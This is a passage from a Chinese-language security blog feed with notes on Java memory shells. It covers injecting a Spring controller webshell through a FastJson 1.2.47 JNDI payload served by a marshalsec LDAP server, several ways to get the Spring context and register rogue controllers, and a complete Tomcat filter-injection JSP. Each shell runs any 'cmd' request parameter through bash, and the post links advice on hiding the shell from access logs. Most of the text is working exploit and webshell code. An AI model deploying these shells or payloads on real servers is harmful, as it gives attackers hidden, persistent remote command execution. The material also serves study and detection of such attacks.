class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,request.getParameter(<span class="string">"cmd"</span>)).start();</span><br><span class="line">        <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line">        writer.write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">        writer.flush();</span><br><span class="line">        writer.close();</span><br><span class="line">        process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动恶意LDAP服务，在8090开启web服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8090/#InjectToController</span></span><br></pre></td></tr></table></figure><p>直接向vuln路由打fastjson payload，注入controller内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content=&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"ldap://127.0.0.1:1389/#InjectToController"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入成功</p><p><img src="/2022/05/26/Java-09/WA-OaE9WFvRrDNFbRiCEOQF3GegzluUFpGRMNuoqG3I.png" alt="image"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>controller处理是在interceptor之后，注入恶意controller也可以达到效果</p><p>这里controller具体的调度过程不再分析，注入的流程大体为从context获取到mappingHandlerMapping对象，创建恶意的RequestMappingInfo实例，然后调用mappingHandlerMapping的mappingHandlerMapping注册即可</p><p>尝试在springboot 2.6.0之后复现，成功注入内存马，但是访问的时候报错</p><p><code>java.lang.IllegalArgumentException: Expected lookupPath in request attribute &quot;org.springframework.web.util.UrlPathHelper.PATH&quot;.</code> </p><p>查了一下发现在springboot 2.6.0之后不能有自定义注册RequestMapping的逻辑，应该也是为了防御内存马，除了添加配置目前没有找到比较好的解决方法</p><p><a href="https://liuyanzhao.com/1503010911382802434.html" target="_blank" rel="noopener">https://liuyanzhao.com/1503010911382802434.html</a></p><p><a href="https://blog.csdn.net/maple_son/article/details/122572869" target="_blank" rel="noopener">https://blog.csdn.net/maple_son/article/details/122572869</a></p><h2 id="获取Context方法"><a href="#获取Context方法" class="headerlink" title="获取Context方法"></a>获取Context方法</h2><p>来自landgrey师傅分享</p><ol><li>getCurrentWebApplicationContext</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p>springboot 2.5.13测试获取失败</p><ol start="2"><li>WebApplicationContextUtils</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure><p>springboot 2.5.13测试获取失败，<code>org.springframework.web.servlet.support.RequestContextUtils</code> 没有getWebApplicationContext方法</p><p><img src="/2022/05/26/Java-09/YtoyZNq30d8gRVwD0DpKL3oHS_ZGhMHyxtBu3TWXWLg.png" alt="image"></p><ol start="3"><li>RequestContextUtils</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure><p>springboot 2.5.13测试获取失败，<code>org.springframework.web.servlet.support.RequestContextUtils</code> 没有getWebApplicationContext方法</p><ol start="4"><li>getAttribute</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>springboot 2.5.13测试成功</p><p><img src="/2022/05/26/Java-09/8ewg8SkImNvfIpp5FNCtBkhk1hYVNAKSdPjrJ23A3u8.png" alt="image"></p><ol start="5"><li>LiveBeansView</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span></span><br><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">"org.springframework.context.support.LiveBeansView"</span>).getDeclaredField(<span class="string">"applicationContexts"</span>);</span><br><span class="line"><span class="comment">// 2. 属性被 private 修饰，所以 setAccessible true</span></span><br><span class="line">filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 3. 获取一个 ApplicationContext 实例</span></span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure><p>springboot 2.5.13测试成功</p><p>因为applicationContexts，使用了 <code>private static final</code> 修饰符，所以可以直接反射获取属性值，反射的get函数传入任何对象都是可以的，包括null</p><p>值得注意的是，因为 <code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> <strong>3.2.x</strong> 版本（现在最新版本是 <strong>5.3.x</strong>）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例</p><h2 id="注册Controller方法"><a href="#注册Controller方法" class="headerlink" title="注册Controller方法"></a>注册Controller方法</h2><p>我在springboot 2.5.14和2.6.0测试只有第一种方法能够成功注册，2.6.0能成功注册但是访问的时候报错，其他在测试的时候因为context缺少getBeanFactory方法失败</p><ol><li>registerMapping</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span><br><span class="line">Method method = (Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 3. 定义访问 controller 的 URL 地址</span></span><br><span class="line">PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">"/hahaha"</span>);</span><br><span class="line"><span class="comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">RequestMethodsRequestCondition ms = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line"><span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">RequestMappingInfo info = <span class="keyword">new</span> RequestMappingInfo(url, ms, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">r.registerMapping(info, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance(), method);</span><br></pre></td></tr></table></figure><ol start="2"><li>registerHandler</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">"dynamicController"</span>, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance());</span><br><span class="line"><span class="comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 3. 反射获得 registerHandler Method</span></span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(dh, <span class="string">"/favicon"</span>, <span class="string">"dynamicController"</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>detectHandlerMethods</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">context.getBeanFactory().registerSingleton(<span class="string">"dynamicController"</span>, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance());</span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);</span><br><span class="line">m1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">m1.invoke(requestMappingHandlerMapping, <span class="string">"dynamicController"</span>);</span><br></pre></td></tr></table></figure><h2 id="Refferences"><a href="#Refferences" class="headerlink" title="Refferences"></a>Refferences</h2><ul><li><a href="https://mp.weixin.qq.com/s/12ovmcKHzozFGlxK9ZBzqw" target="_blank" rel="noopener">深入浅出内存马(二) 之SpringBoot内存马</a></li><li><a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">基于内存 Webshell 的无文件攻击技术研究</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Interceptor-Memory-Shell&quot;&gt;&lt;a href=&quot;#Interceptor-Memory-Shell&quot; class=&quot;headerlink&quot; title=&quot;Interceptor Memory Shell&quot;&gt;&lt;/a&gt;Interceptor Memory Shell&lt;/h2&gt;&lt;h3 id=&quot;实例&quot;&gt;&lt;a href=&quot;#实例&quot; class=&quot;headerlink&quot; title=&quot;实例&quot;&gt;&lt;/a&gt;实例&lt;/h3&gt;&lt;p&gt;JDK 1.8.0_20，采用FastJson 1.2.47的RCE来创造反序列化漏洞利用点&lt;/p&gt;
&lt;p&gt;创建springboot项目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/05/26/Java-09/9kJm5LG_ftZ8GMt5iJHY4At-xMh3DIlyi5d5EIiNJ80.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat Memory Shell</title>
    <link href="https://jlkl.github.io/2022/05/26/Java-08/"/>
    <id>https://jlkl.github.io/2022/05/26/Java-08/</id>
    <published>2022-05-26T01:33:21.000Z</published>
    <updated>2022-05-26T01:48:11.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>本系列主要是补以前落下的知识，参考了很多大师傅的文章，非常感谢师傅们的分享</p><h2 id="Filter-Memory-Shell"><a href="#Filter-Memory-Shell" class="headerlink" title="Filter Memory Shell"></a>Filter Memory Shell</h2><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>我这里使用的是idea 2021.2，maven quickstart</p><p><img src="/2022/05/26/Java-08/1jxGI7ioBpMxiiPDgQ06oy_LFYKlup5yZjw6QsKDzN4.png" alt="image"></p><a id="more"></a><p>右键项目，Add Framework Support</p><p><img src="/2022/05/26/Java-08/yEJgpV551W5vE-umf-kl08D6pVxRnHhqY8o8Osdja-A.png" alt="image"></p><p>然后配置tomcat，选择Run-&gt;Edit Configuration-&gt;左上角加号-&gt;Tomcat Server(注意不是TomEE)-&gt;Local</p><p><img src="/2022/05/26/Java-08/J3Zg_5a4ZFmdSfAvFxG7KNPNBj98ICLlLWz9PoyWvSY.png" alt="image"></p><p>选择第二个选项卡Deployment-&gt;右边的加号-&gt;选择Artifact，然后启动tomcat即可</p><p><img src="/2022/05/26/Java-08/KjKDaRQOgcLhs3R4iNoAeIyBQk0BCAUcC9xoZt-k5Z0.png" alt="image"></p><p>project structure，把tomcat的lib加到libraries里，方便后面调试</p><p><img src="/2022/05/26/Java-08/YlcP3a7lyt7_GGgIhKNhBRnJaICzt3xjT8poGWRY-R0.png" alt="image"></p><p>添加addfilter.jsp，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.Context"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationFilterConfig"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%--&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterMap"</span> %&gt;--%&gt;</span><br><span class="line">&lt;%--&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.deploy.FilterDef"</span> %&gt;--%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.*"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.annotation.WebServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.http.HttpServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.http.HttpServletRequest"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.http.HttpServletResponse"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Constructor"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> revise the <span class="keyword">import</span> <span class="class"><span class="keyword">class</span> <span class="title">with</span> <span class="title">correct</span> <span class="title">tomcat</span> <span class="title">version</span> --&gt;</span></span><br><span class="line"><span class="class">&lt;!-- 2 <span class="title">request</span> <span class="title">this</span> <span class="title">jsp</span> <span class="title">file</span> --&gt;</span></span><br><span class="line"><span class="class">&lt;!-- 3 <span class="title">request</span> <span class="title">xxxx</span>/<span class="title">this</span> <span class="title">file</span>/../<span class="title">abcd</span>?<span class="title">cmdc</span></span>=calc --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">DefaultFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">      HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">      HttpServletResponse response = (HttpServletResponse) servletResponse;</span><br><span class="line">      <span class="keyword">if</span> (req.getParameter(<span class="string">"cmd"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,req.getParameter(<span class="string">"cmd"</span>)).start();</span><br><span class="line">        <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">        servletResponse.getWriter().write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">        process.destroy();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  String name = <span class="string">"DefaultFilter"</span>;</span><br><span class="line">  ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">  Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">  appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">  Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">  stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">  Field Configs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">  Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">  Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line">  <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">    DefaultFilter filter = <span class="keyword">new</span> DefaultFilter();</span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern("/*");</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">"/str3am"</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    Constructor constructor = ApplicationFilterConfig<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="title">Context</span>.<span class="title">class</span>, <span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">    out.write(<span class="string">"Inject success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">"Injected"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>启动tomcat后访问addfilter.jsp，注入内存马成功</p><p><img src="/2022/05/26/Java-08/2sPuohXtki53FMSlRtBmYgHeC4aqqAW-j1PwobLE0gM.png" alt="image"></p><p>隐藏内存马访问日志记录可以参考这篇：<a href="https://www.anquanke.com/post/id/225027" target="_blank" rel="noopener">Tomcat容器攻防笔记之隐匿行踪 - 安全客</a></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>创建一个简单的filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter</span>(filterName = <span class="string">"Filter"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Filter 创建"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"销毁！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"执行过滤过程"</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>myFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.MyFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>myFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以使用标记声明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter</span>(filterName = <span class="string">"CharsetFilter"</span>,</span><br><span class="line">        urlPatterns = <span class="string">"/*"</span>,<span class="comment">/*通配符（*）表示对所有的web资源进行拦截*/</span></span><br><span class="line">        initParams = &#123;</span><br><span class="line">                <span class="meta">@WebInitParam</span>(name = <span class="string">"charset"</span>, value = <span 